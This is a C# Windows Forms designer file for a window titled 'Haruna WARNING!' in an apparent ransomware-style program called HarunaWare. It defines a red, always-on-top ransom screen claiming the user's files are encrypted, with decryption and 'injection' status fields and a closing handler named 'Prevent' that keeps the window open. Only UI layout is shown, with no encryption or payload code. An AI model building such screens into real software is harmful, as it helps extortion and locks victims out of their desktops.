namespace HarunaWare
{
	public partial class frmWarning : global::System.Windows.Forms.Form
	{
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(frmWarning));
            this.MessageHeader = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.decryptProgress = new System.Windows.Forms.ProgressBar();
            this.DecryptStatus = new System.Windows.Forms.Label();
            this.DecryptStatusLabel = new System.Windows.Forms.Label();
            this.ScoreStatus = new System.Windows.Forms.Label();
            this.ScoreLabel = new System.Windows.Forms.Label();
            this.ProcStatus = new System.Windows.Forms.Label();
            this.StatusLabel = new System.Windows.Forms.Label();
            this.ButtonExit = new System.Windows.Forms.Button();
            this.ButtonManualDecrypt = new System.Windows.Forms.Button();
            this.buttonENG = new System.Windows.Forms.Button();
            this.buttonCN = new System.Windows.Forms.Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // MessageHeader
            // 
            this.MessageHeader.Font = new System.Drawing.Font("Verdana", 48F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.MessageHeader.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.MessageHeader.Location = new System.Drawing.Point(-2, -23);
            this.MessageHeader.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.MessageHeader.Name = "MessageHeader";
            this.MessageHeader.Size = new System.Drawing.Size(804, 129);
            this.MessageHeader.TabIndex = 0;
            this.MessageHeader.Text = "WARNING!";
            this.MessageHeader.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.MessageHeader.Click += new System.EventHandler(this.MessageHeader_Click);
            // 
            // label1
            // 
            this.label1.Font = new System.Drawing.Font("Verdana", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.label1.Location = new System.Drawing.Point(5, 82);
            this.label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(567, 54);
            this.label1.TabIndex = 1;
            this.label1.Text = "Ur ppt have been encrypted by Haruna!";
            // 
            // label2
            // 
            this.label2.Font = new System.Drawing.Font("Verdana", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.label2.Location = new System.Drawing.Point(376, 123);
            this.label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(346, 33);
            this.label2.TabIndex = 1;
            this.label2.Text = "What the HELL is it?";
            // 
            // label3
            // 
            this.label3.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.label3.Location = new System.Drawing.Point(378, 156);
            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(345, 125);
            this.label3.TabIndex = 2;
            this.label3.Text = resources.GetString("label3.Text");
            // 
            // label4
            // 
            this.label4.Font = new System.Drawing.Font("Verdana", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.label4.Location = new System.Drawing.Point(5, 409);
            this.label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(385, 33);
            this.label4.TabIndex = 1;
            this.label4.Text = "How can I recover my file?";
            // 
            // label5
            // 
            this.label5.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.label5.Location = new System.Drawing.Point(7, 442);
            this.label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(344, 193);
            this.label5.TabIndex = 2;
            this.label5.Text = resources.GetString("label5.Text");
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.decryptProgress);
            this.groupBox1.Controls.Add(this.DecryptStatus);
            this.groupBox1.Controls.Add(this.DecryptStatusLabel);
            this.groupBox1.Controls.Add(this.ScoreStatus);
            this.groupBox1.Controls.Add(this.ScoreLabel);
            this.groupBox1.Controls.Add(this.ProcStatus);
            this.groupBox1.Controls.Add(this.StatusLabel);
            this.groupBox1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
            this.groupBox1.Location = new System.Drawing.Point(382, 269);
            this.groupBox1.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Padding = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.groupBox1.Size = new System.Drawing.Size(388, 152);
            this.groupBox1.TabIndex = 3;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Status";
            // 
            // decryptProgress
            // 
            this.decryptProgress.Location = new System.Drawing.Point(7, 113);
            this.decryptProgress.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.decryptProgress.Name = "decryptProgress";
            this.decryptProgress.Size = new System.Drawing.Size(374, 33);
            this.decryptProgress.TabIndex = 1;
            // 
            // DecryptStatus
            // 
            this.DecryptStatus.Location = new System.Drawing.Point(125, 89);
            this.DecryptStatus.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DecryptStatus.Name = "DecryptStatus";
            this.DecryptStatus.Size = new System.Drawing.Size(257, 20);
            this.DecryptStatus.TabIndex = 0;
            this.DecryptStatus.Text = "Not Approved!";
            // 
            // DecryptStatusLabel
            // 
            this.DecryptStatusLabel.AutoSize = true;
            this.DecryptStatusLabel.Location = new System.Drawing.Point(7, 89);
            this.DecryptStatusLabel.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DecryptStatusLabel.Name = "DecryptStatusLabel";
            this.DecryptStatusLabel.Size = new System.Drawing.Size(95, 16);
            this.DecryptStatusLabel.TabIndex = 0;
            this.DecryptStatusLabel.Text = "Decryption: ";
            // 
            // ScoreStatus
            // 
            this.ScoreStatus.AutoSize = true;
            this.ScoreStatus.Location = new System.Drawing.Point(119, 68);
            this.ScoreStatus.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.ScoreStatus.Name = "ScoreStatus";
            this.ScoreStatus.Size = new System.Drawing.Size(55, 16);
            this.ScoreStatus.TabIndex = 0;
            this.ScoreStatus.Text = "Wait...";
            this.ScoreStatus.Visible = false;
            // 
            // ScoreLabel
            // 
            this.ScoreLabel.AutoSize = true;
            this.ScoreLabel.Location = new System.Drawing.Point(7, 68);
            this.ScoreLabel.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.ScoreLabel.Name = "ScoreLabel";
            this.ScoreLabel.Size = new System.Drawing.Size(81, 16);
            this.ScoreLabel.TabIndex = 0;
            this.ScoreLabel.Text = "Injection :";
            this.ScoreLabel.Visible = false;
            // 
            // ProcStatus
            // 
            this.ProcStatus.AutoSize = true;
            this.ProcStatus.Location = new System.Drawing.Point(154, 45);
            this.ProcStatus.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.ProcStatus.Name = "ProcStatus";
            this.ProcStatus.Size = new System.Drawing.Size(81, 16);
            this.ProcStatus.TabIndex = 0;
            this.ProcStatus.Text = "Not Found";
            // 
            // StatusLabel
            // 
            this.StatusLabel.AutoSize = true;
            this.StatusLabel.Location = new System.Drawing.Point(7, 47);
            this.StatusLabel.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.StatusLabel.Name = "StatusLabel";
            this.StatusLabel.Size = new System.Drawing.Size(120, 16);
            this.StatusLabel.TabIndex = 0;
            this.StatusLabel.Text = "Process Status:";
            // 
            // ButtonExit
            // 
            this.ButtonExit.BackColor = System.Drawing.Color.Gainsboro;
            this.ButtonExit.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.ButtonExit.Location = new System.Drawing.Point(594, 426);
            this.ButtonExit.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.ButtonExit.Name = "ButtonExit";
            this.ButtonExit.Size = new System.Drawing.Size(176, 67);
            this.ButtonExit.TabIndex = 7;
            this.ButtonExit.Text = "Exit";
            this.ButtonExit.UseVisualStyleBackColor = false;
            this.ButtonExit.Visible = false;
            this.ButtonExit.Click += new System.EventHandler(this.ButtonExit_Click);
            // 
            // ButtonManualDecrypt
            // 
            this.ButtonManualDecrypt.BackColor = System.Drawing.Color.Gainsboro;
            this.ButtonManualDecrypt.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.ButtonManualDecrypt.Location = new System.Drawing.Point(382, 426);
            this.ButtonManualDecrypt.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.ButtonManualDecrypt.Name = "ButtonManualDecrypt";
            this.ButtonManualDecrypt.Size = new System.Drawing.Size(176, 67);
            this.ButtonManualDecrypt.TabIndex = 7;
            this.ButtonManualDecrypt.Text = "Manual Decrypter";
            this.ButtonManualDecrypt.UseVisualStyleBackColor = false;
            this.ButtonManualDecrypt.Visible = false;
            this.ButtonManualDecrypt.Click += new System.EventHandler(this.ButtonManualDecrypt_Click);
            // 
            // buttonENG
            // 
            this.buttonENG.BackColor = System.Drawing.Color.Gainsboro;
            this.buttonENG.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.buttonENG.Location = new System.Drawing.Point(382, 499);
            this.buttonENG.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.buttonENG.Name = "buttonENG";
            this.buttonENG.Size = new System.Drawing.Size(176, 67);
            this.buttonENG.TabIndex = 8;
            this.buttonENG.Text = "Я не понимаю";
            this.buttonENG.UseVisualStyleBackColor = false;
            this.buttonENG.Click += new System.EventHandler(this.buttonENG_Click);
            // 
            // buttonCN
            // 
            this.buttonCN.BackColor = System.Drawing.Color.Gainsboro;
            this.buttonCN.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.buttonCN.Location = new System.Drawing.Point(594, 499);
            this.buttonCN.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.buttonCN.Name = "buttonCN";
            this.buttonCN.Size = new System.Drawing.Size(176, 67);
            this.buttonCN.TabIndex = 9;
            this.buttonCN.Text = "我不明白";
            this.buttonCN.UseVisualStyleBackColor = false;
            this.buttonCN.Click += new System.EventHandler(this.buttonCN_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Location = new System.Drawing.Point(10, 123);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(358, 283);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 6;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
            // 
            // label6
            // 
            this.label6.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
            this.label6.Location = new System.Drawing.Point(378, 568);
            this.label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(392, 67);
            this.label6.TabIndex = 10;
            this.label6.Text = "If you need help ,but do not off this window!!\r\n";
            // 
            // frmWarning
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 17F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Red;
            this.ClientSize = new System.Drawing.Size(780, 657);
            this.ControlBox = false;
            this.Controls.Add(this.label6);
            this.Controls.Add(this.buttonCN);
            this.Controls.Add(this.buttonENG);
            this.Controls.Add(this.ButtonManualDecrypt);
            this.Controls.Add(this.ButtonExit);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.MessageHeader);
            this.DoubleBuffered = true;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.Margin = new System.Windows.Forms.Padding(4, 3, 4, 3);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "frmWarning";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Haruna WARNING!";
            this.TopMost = true;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Prevent);
            this.Load += new System.EventHandler(this.frmWarning_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

		}

		private global::System.ComponentModel.IContainer components = null;

		private global::System.Windows.Forms.Label MessageHeader;

		private global::System.Windows.Forms.Label label1;

		private global::System.Windows.Forms.Label label2;

		private global::System.Windows.Forms.Label label3;

		private global::System.Windows.Forms.Label label4;

		private global::System.Windows.Forms.Label label5;

		private global::System.Windows.Forms.GroupBox groupBox1;

		private global::System.Windows.Forms.ProgressBar decryptProgress;

		private global::System.Windows.Forms.Label DecryptStatus;

		private global::System.Windows.Forms.Label DecryptStatusLabel;

		private global::System.Windows.Forms.Label ScoreStatus;

		private global::System.Windows.Forms.Label ProcStatus;

		private global::System.Windows.Forms.Label StatusLabel;

		private global::System.Windows.Forms.Button ButtonExit;

		private global::System.Windows.Forms.Button ButtonManualDecrypt;
        private System.Windows.Forms.Label ScoreLabel;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Button buttonENG;
        private System.Windows.Forms.Button buttonCN;
        private System.Windows.Forms.Label label6;
    }
}
